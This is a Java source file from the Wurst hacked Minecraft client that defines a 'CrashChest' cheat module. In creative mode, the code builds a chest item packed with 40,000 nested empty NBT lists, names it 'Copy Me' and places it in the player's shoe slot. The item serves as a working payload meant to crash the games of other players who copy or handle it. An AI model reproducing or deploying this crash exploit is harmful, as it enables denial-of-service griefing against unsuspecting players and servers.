/*
 * Copyright (c) 2014-2025 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import net.minecraft.core.component.DataComponents;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.chat.Component;
import net.minecraft.world.entity.EquipmentSlot;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.component.CustomData;
import net.minecraft.world.level.block.Blocks;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;

@SearchTags({"crash chest"})
public final class CrashChestHack extends Hack
{
	public CrashChestHack()
	{
		super("CrashChest");
		
		setCategory(Category.ITEMS);
	}
	
	@Override
	protected void onEnable()
	{
		if(!MC.player.getAbilities().instabuild)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		
		if(!MC.player.getItemBySlot(EquipmentSlot.FEET).isEmpty())
		{
			ChatUtils.error("Please clear your shoes slot.");
			setEnabled(false);
			return;
		}
		
		// generate item
		ItemStack stack = new ItemStack(Blocks.CHEST);
		CompoundTag nbtCompound = new CompoundTag();
		ListTag nbtList = new ListTag();
		for(int i = 0; i < 40000; i++)
			nbtList.add(new ListTag());
		nbtCompound.put("www.wurstclient.net", nbtList);
		stack.set(DataComponents.CUSTOM_DATA, CustomData.of(nbtCompound));
		stack.set(DataComponents.CUSTOM_NAME, Component.literal("Copy Me"));
		
		// give item
		MC.player.equipment.set(EquipmentSlot.FEET, stack);
		ChatUtils.message("Item has been placed in your shoes slot.");
		setEnabled(false);
	}
}
